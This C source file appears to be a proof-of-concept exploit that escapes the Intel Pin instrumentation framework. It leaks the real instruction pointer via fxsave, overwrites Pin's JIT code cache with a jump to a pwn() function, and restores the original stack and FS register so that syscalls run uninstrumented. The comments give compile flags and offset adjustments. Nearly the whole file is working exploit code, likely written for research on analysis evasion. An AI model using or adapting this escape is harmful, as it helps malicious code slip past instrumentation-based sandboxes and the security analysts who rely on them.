#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include <asm/prctl.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/types.h>

/*
    ATTENTION 1: Compile as listed below or the constants in the following have to be adjusted!
    ATTENTION 2: The stack restore procedure in pwn function should be adjusted according to
                 the way currently utilised PIN tool instruments the code.

    gcc -o obj-intel64/escape -O3 escape.c
 
    ATTENTION 3: Please make sure to change the necessary offsets described in the beginning of
                 the main function if you compile the program with -fstack-protector-all flag
                 enabled.
 
    gcc -o obj-intel64/escape -O3 escape.c -fstack-protector-all

*/
unsigned long get_real_rip() {
    unsigned long fxsave_memoty[0x34];
    memset(fxsave_memoty, 0, sizeof(fxsave_memoty));

    asm volatile (
        "fldpi\n\t"
        "fxsave64 %0"
        : "=m" (fxsave_memoty)
    );

    return fxsave_memoty[1];
}

void pwn() {
    // This function should not have any local variables
    // which might trigger the creation of stack canaries by
    // the compiler, because program's fs value is still
    // set to Pin's fs. But one can change the jump offset
    // in main to jump over the cookie placement on the stack.

    // Change stack to application's original value
    asm volatile (
        "mov 0x40(%%r15), %%rsp\n\t"
        "ret"
        ::
    );
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        puts("Execute this program with some parameter to pwn");
    }

    // Get address of the function to be called outside of sandbox
    // If for some reason this was compiled with -fstack-protector-all
    // please use pwn + 0x10 as pwnAddress in order to surpass the cookie
    // placement on the stack (see pwn function).
    unsigned char *pwnAddress = (unsigned char *) pwn;

    // Execute to jitted code, save it in the code cache, and get its address
    unsigned long rip = get_real_rip();

    if (argc > 1) {

        // Overwrite code cache
        memcpy((void *) rip, "\x48\xb8", 2); // mov rax, pwnAddress
        memcpy((void *) rip+2, &pwnAddress, 8);
        memcpy((void *) rip+10, "\xff\xe0", 2); // jmp rax;

        // Call the same function again to execute the overwritten code cache
        rip = get_real_rip();

        // Fix fs value because of canary checks
        // Apparantly, Pin uses its fs value and application's original
        // fs and fs pointer are very much accessible from user space :]
        unsigned long fs;
        asm volatile (
            "mov 0x3d8(%%r15), %0"
            : "=r" (fs)
        );

        if (syscall(SYS_arch_prctl, ARCH_SET_FS, fs) != 0) {

            // If the system call fails we exit gracefully
            // using inlined assembly since the libc wrapper
            // functions will fail because of corrupted fs value
            const char *fsFail = "FS register could not be set!\n";

            // Write syscall
            asm volatile (
                "mov $0x1e, %%edx\n\t"
                "mov %0, %%rsi\n\t"
                "mov $0x1, %%rdi\n\t"
                "mov $0x1, %%rax\n\t"
                "syscall"
                :: "r" (fsFail)
                : "edx", "rsi", "rdi", "rax"
            );

            // Exit gracefully
            asm volatile (
                "mov $0xe7, %%rax\n\t"
                "syscall"
                ::
                : "rax"
            );
        }
    }

    puts("--Application--\tExecuting syscall number 39 (sys_getpid)");

    // Execute syscall with some visible side effect
    pid_t pid = 0;
    asm volatile (
        "mov $0x27, %%rax\n\t"
        "syscall\n\t"
        "mov %%eax, %0"
        : "=m"(pid)
        :: "rax"
    );

    printf("--Application--\tThe proccess PID is: %u\n", pid);

    puts("--Application--\tExiting..");

    return 0;
}
